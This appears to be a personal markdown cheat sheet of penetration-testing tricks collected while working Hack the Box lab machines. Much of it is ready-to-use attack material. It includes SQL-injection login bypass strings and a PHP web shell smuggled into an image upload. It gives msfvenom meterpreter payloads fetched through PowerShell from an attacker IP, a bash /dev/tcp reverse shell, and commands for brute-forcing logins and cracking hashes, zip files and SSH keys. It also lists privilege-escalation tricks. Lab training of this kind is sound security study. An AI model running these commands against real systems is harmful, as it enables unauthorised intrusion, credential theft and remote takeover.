# tricks-htb
Tricks learned while working on the Hack the Box lab.

### Create Python http server to serve files
```bash
python -m SimpleHTTPServer
python3 -m http.server
```

### Bypass login
```
' or 1 = 1--
user'-- -
```

### Enumeration
https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

### PHP reverse shell
https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

### Spawn bash shell using Python
```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
```
The press ctrl + z

Then run: `stty raw -echo`

Then write `fg` and press enter (note there's no output of `fg`)

### Reverse shell cheatsheet
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

### Dump traffic on an interface to console
This is useful when blind-exploiting a system, among other situations. Just dump the traffic of an interface to console:
```
tcpdump -i tun0 
```

### Exploit suggester for postexploitation on Metasploit
Use `post/multi/recon/local_exploit_suggester` after a non-admin meterpreter session is created in order to get suggestions on which exploits could be executed next.

### DNS
DNS servers are added to `/etc/resolv.conf`. It may be useful for when the server just accepts requests when host equals to _machineName.htb_. Otherwise the same could be achieved by adding an entry to the file `/etc/hosts`.

Use `nslookup` to get info from a DNS server:
```
nslookup
> SERVER {{serverip}}
or
> {{server name}}
> 
```

### Using `host`
Use `host` to get the name servers' urls:
```
host -t ns {{domain name}}
```

Do a host transfer zone query:
```
host -l {{domain name}} {{name server}}
```

### Using `dig`
Use `dig` to get the name servers' urls:
```
dig -t ns {{url}}
```

Do a host transfer query:
```
dig axfr {{domain name}} @{{name server}}
```
Hackersploit on zone transfers: https://www.youtube.com/watch?v=kdYnSfzb3UA

### SMB
Use smbmap to enumerate SMB. `smbmap -H $HOST_IP` 

### Redirects
If when intercepting the server responses with a proxy and the `302 Found` response has some content, the HTTP response number and code can be manually changed to, for example, `200 OK` to see the content on the browser instead of following the redirect.

### Abstract shit
- If there are so many things that look the same, check if there's one of them that's different. In general, this can be files sizes, files contents, last modification date, etc.

### Shell from mysql
```
mysql -u admin -p
mysql --host=localhost --user=myname --password mydb
mysql -h localhost -u myname -p mydb

show databases;
use {{dbname}}
show tables;
```

Run this from mysql to drop to a shell and see what user you are on:
`\! /bin/sh`

### Injecting php shell in image file
- Upload a proper image with the intercept on the proxy
- From the proxy, keep the following code as the "image"'s content: `{{imageMagicBytes}} <?php echo system($_REQUEST['whatever']); ?>`
- Also change the file name and append `.php` (if the image name is image.gif, it would be image.gif.php)
- Access the file from the browser and add `?whatever={{command}}`

Tip: The `file` command gets a file's type. It may be useful to test if the command says the file is an image.
Tip2: Gif's magic bytes are `GIF8;`.

### Wordpress
Use `wpscan` to scan Wordpress sites. If vulnerabilities are found, search for them on searchsploit.

### jar files
Jar files can be decompiled to get information from them. First, unzip it using `unzip`, then decompile the unzipped .class file using the program `jad`.

### Do several scans concurrently
Mainly for when there are several services running on the server, but it should be always done that way. After the initial nmap scan has finished, start several scans depending on the case. Eg if port 80 is open, trigger gobuster (with 2 lists, one short and one longer), nikto and maybe an nmap vuln scan.

### Check if port is open with nc
`nc -zv $HOST_IP $PORT`

### Scan all the ports with nmap
To scan all the ports with nmap add `-p-`.

### Threads number
For max speed while running scans don't forget to increase the number of threads.

### Also enumerate recursively
Recursive enumeration is important whenever we run out of options.

### exiftool to get files metadata
Use: `exiftool {{filename}}`
Note that browsers sometimes squash some metadata when downloading files, so download them using `wget` instead.

### Use book.hacktricks.xyz
Great resource, do check out when Duckduckgoing.

### Redis
When redis is available on the server, a common thing to try is to upload a file to gain access. https://book.hacktricks.xyz/pentesting/6379-pentesting-redis

### Get strings from a binary
Use `strings {{filename}}` to get strings from binaries. This may help find passwords or other sensitive information.

### Multiple windows with `tmux` or `screen`

### Find files and directories you can write
`find . -writable`

### Redirect errors to /dev/null `2>/dev/null`
https://askubuntu.com/questions/350208/what-does-2-dev-null-mean

### Get information about files using `stat`
Use `use {{filename}}`

### Identify hash type
Use `hash-identifier`

### Crack hash with hashcat
keywords: .htpasswd
Even though it is possible to use the hash identifier to detect the hash type, also the hashcat's hash examples can be used:
```
hashcat --example-hashes
```

Crack:
```
hashcat -m {{mode id (check table in hashcat -h)}} {{path to file with just the pass eg /usr/share/wordlists/rockyou.txt}}
```

### Bruteforce ssh key with John the Ripper
If you run into an encrypted ssh key, that will start by something like this:
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C
```

Then the process of bruteforcing has 2 steps:
1) Transform from ssh format to john format:
`python /usr/share/john/ssh2john.py key.ssh > key.john.ssh`
2) Bruteforce:
`john -wordlist={{wordlist path}} key.john.ssh`

### Dirty cow Linux privesc
Apparently very common for many outdated Linux kernels.
https://github.com/FireFart/dirtycow/blob/master/dirty.c

### `steghide` to extract or inject files in images

### Privesc trick
When a SUID program invokes another program just by its name without specifying location, it may be possible to do a PATH trick to make it execute the wrong one as root: inject another dir to the path that contains a program with the same name but performs something we want. (FIXME reword this)

### Reverse engineering a binary with `strace` and `ltrace`
It is possible to capture the system calls running `strace {{program call}}` and the library calls using `ltrace {{program call}}`.

### Base64 encode binary to copy it like text from console
```base64 -w0 {{binary}}```

### Anonymous for an ftp server
If anonymous access is detected by, for example, an nmap scan, connect to it using user=anonymous and it does not really matter what is passed as password.

### `msfvenom`
Get file types available:
```
msfvenom --help-formats
```

Generate a meterpreter reverse shell for windows (same for linux, just replace the word):
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST={{attackerIP}} LPORT={{attackerPort}} -f {{fileType}} -o {{outputFile}}
```

When executed from the victim, it will trigger a reverse shell if there's a listener set up from Metasploit:
```
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
```

Then set options and run.

### Use `systeminfo` on the Windows shell
In the results, check the Hotfixes part to see if the system has been updated, and what updates it has.

### Upgrade regular shell to meterpreter shell (Windows)
Once there is a regular shell available, it may be useful to upgrade it to a meterpreter shell to use metasploit modules to, for example, escalate privileges.

Generate executable using `msfvenom`:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.19 LPORT=6666 -f exe -o hola.exe
```

> When working with Windows x64, use `windows/x64/meterpreter/reverse_tcp` as payload instead.

After making hola.exe available through a web server on the attacker machine (use Python http simple web server for that), download it using Powershell on the target machine:
```
powershell "(New-Object System.Net.Webclient).Downloadfile('http://10.10.14.19:8000/hola.exe', 'meterpreter.exe')"
```

Use the multi handler module to listen to connections on the attacker machine:
```
use multi/handler
set LPORT 6666
set LHOST tun0
run
```

Execute `meterpreter.exe` on the victim machine and the listener should pop a meterpreter shell.

### List free space of every device
```
df -lh
```

### File/data recovery
There are several ways to do data recovery from a device:
1) `strings /dev/devicename`: This will get all the strings on the device and may include deleted files' strings.
2) `xxd /dev/devicename`: Does a hexdump of all the contents of the device.
3) Check ippsec's Mirai walkthrough for hints on how to use  https://www.youtube.com/watch?v=YRsfX6DW10E

### Trying to get a foothold and no tool seems to work?
Have you Googled `{{app|service|platform}} remote code execution`?

### Burp url encode
When intercepting a request with Burp, if the information that is being sent to the server eg. a url command to trigger a reverse shell, is sent as a query string, select it and press `ctrl + u` to url-encode it.

### Check SSL certificate info
If the box has the port 443 open, check certificate info. Subdomains and email addresses could be taken from there.

### If you got email credentials, check them on an email client

### Use rumkin cipher tools for any cipher-related problem
http://rumkin.com/tools/cipher/

### Learn cryto at https://cryptopals.com/

### Crack zip files
If a zip file requires a password to unzip, use `fcrackzip` to crack it:
```
fcrackzip -D -p /usr/share/wordlists/rockyou.txt file.zip
```

### Mongo db
Connect: `mongo -p -u {{username}} {{dbname}}`
Insert: `db.{{tablename}}.insert({datafield1: datavalue1})`

### Find setuid files
When a file has the setuid flag set, it means it can be executed (or applied changes on) by anybody as they were the file's owner or as they belonged to the owner group. These files are great candidates for privilege escalation. To list them use: `find / -perm 4000 2>/dev/null`.

### Interrogation marks `cd /r??t`
Sometimes there is a blacklisting method that prevents the inclusion of, for example, the word _root_, in a command or path. Using the interrogation marks can be helpful in some cases.

### wfuzz
```
wfuzz -c -z file,/usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt -z file,/usr/share/wordlists/SecLists/Passwords/xato-net-10-million-passwords-100.txt -d "username=FUZZ&password=FUZ2Z" {{url}}
```

### sqlmap
Using a proxy or the browser itself save a complete login request (including body) and then just run the following:
```
sqlmap -r request.req
```

### NoSQL injection
https://book.hacktricks.xyz/pentesting-web/nosql-injection
https://medium.com/bugbountywriteup/nosql-injection-8732c2140576

### steganography
https://github.com/DominicBreuker/stego-toolkit

### Check /var/www/html
Go-to folder when there are web apps running on the server.

### SSL CA, site and user certificates
#### Generar certificate authority
Create private key:
```openssl genrsa -aes256 -out ca.key 4096```

Create public certificate:
```openssl req -new -x509 -days 365 -key ca.key -out ca.crt```

### Generate site certificate
Generate key:
```openssl req -newkey rsa:2048 -nodes -keyout mysite.key -out mysite.csr```

Note that csr means certificate signing request.

Sign key:
```openssl x509 -req -days 365 -in mysite.csr -CA ca.crt -CAkey ca.key -set_serial 01 -out mysite.crt```

### Generate user certificate
Generate key
```openssl req -newkey rsa:2048 -nodes -keyout username.key -out username.csr```

Sign user certificate
```openssl x509 -req -days 365 -in username.csr -CA ca.crt -CAkey ca.key -set_serial 02  -out username.crt```

Generate pfx to be imported in the browser
```openssl pkcs12 -export -out username.pfx -inkey username.key -in username.crt```

### SSL get public key from private key
```openssl pkey -in privatekey.key -pubout```

### SSL get public key from cert
```openssl x509 -in cert.crt -pubkey -noout```

### Permissions on folders
When a folder has execution permission but not read permission, it will not allow to list contents of the folder using `ls`, but it will allow to `cd` to any folder or open files in that folder if you already know their names and have permissions to read them.

### Transform to base 10
```$ echo "$((2#0111))"```

### Hydra with body
```
hydra -l admin -P /usr/share/wordlists/SecLists/Passwords/darkweb2017-top1000.txt staging-order.mango.htb http-post-form "/:username=^USER^&password=^PASS^&login=login:Log in for ordering" -V
```

### Get shell with many binaries per file type
https://gtfobins.github.io/gtfobins/

### Too long lines
Piping any command to `less -S` will shorten lines for them to fit in the terminal.

### Wordpress enumeration
Use [wpscan](https://tools.kali.org/web-applications/wpscan) to enumerate wordpress sites.

### Magento enumeration
Use [magescan](https://github.com/steverobbins/magescan) to enumerate magento sites.
```
php magescan.phar scan:all www.example.com
```

### Reverse shell tip
If bash shell is not working, try wrapping it in a bash -c call.
```
"bash -c 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'"
```
